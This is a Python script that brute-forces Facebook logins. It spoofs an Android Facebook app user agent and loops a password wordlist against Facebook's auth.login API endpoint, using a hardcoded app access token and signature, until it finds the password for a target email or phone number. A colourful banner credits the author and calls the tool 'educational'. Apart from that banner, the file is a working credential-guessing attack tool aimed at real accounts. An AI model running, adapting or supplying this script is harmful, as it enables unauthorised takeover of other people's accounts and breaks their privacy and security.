import os
import sys
import time
import json
import mechanize
from mechanize import Browser

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;')]

def wasii(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def methodlogin():
    os.system('clear')
# Define the ASCII art for each lette
    letters = {
        'M': ["##   ##", "### ###", "## # ##", "##   ##", "##   ##"],
        'a': ["  ###  ", " ## ## ", "##   ##", "#######", "##   ##"],
        's': [" ######", "##     ", " ##### ", "     ##", "###### "],
        'o': [" ##### ", "##   ##", "##   ##", "##   ##", " ##### "],
        'u': ["##   ##", "##   ##", "##   ##", "##   ##", " ######"],
        'd': ["###### ", "##   ##", "##   ##", "##   ##", "###### "]
    }

# The text to display
    text = "Massoud"
    colors = {
        'M': '\033[91m',  # Red
        'a': '\033[92m',  # Green
        's': '\033[93m',  # Yellow
        'o': '\033[94m',  # Blue
        'u': '\033[95m',  # Purple
        'd': '\033[96m'   # Cyan
    }

# Reset color at the end
    reset_color = '\033[96m'

# Print each line of the colorful ASCII art
    for i in range(5):
        for char in text:
            print(colors[char]+letters[char][i]+reset_color, end="  ")
        print()
    print("")
    wasii('[\xf0\x9f\x94\x90] \x1b[1;96mWelcome to Massoud. All rights reserved to te.me/Ahmed_Massoud')
    wasii(' This tool is intended for educational purposes, such as explaining brute force attacks, and I am not responsible for any illegal use')
    print("")
    iid = input('[+] Number/Email: ')
    id = iid.replace(' ', '')
    pas= input('[+] passowrds file: ')
    print("")
    try:
    	with open(pas, 'r') as file:
            lines = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"File error: Cannot find '{pas}'")
        return
    for pwd in lines:
        print(f'\r    \x1b[1;96m[!] Trying password: {pwd}', end='')
        sys.stdout.flush()
        data = br.open(
            'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        z = json.load(data)
        if 'access_token' in z:
            print(f'\n    \033[1;32m[☆] The password is correct.\033[0m')
            break
        elif 'www.facebook.com' in z['error_msg']:
            print(f'\n    \033[1;32m[☆] the password is correct but User Must Verify\033[0m')
            break
        else:
            print(f'\n    \033[1;31m[x] Password Is Wrong !\033[0m')
        print("")
if __name__ == '__main__':
    methodlogin()
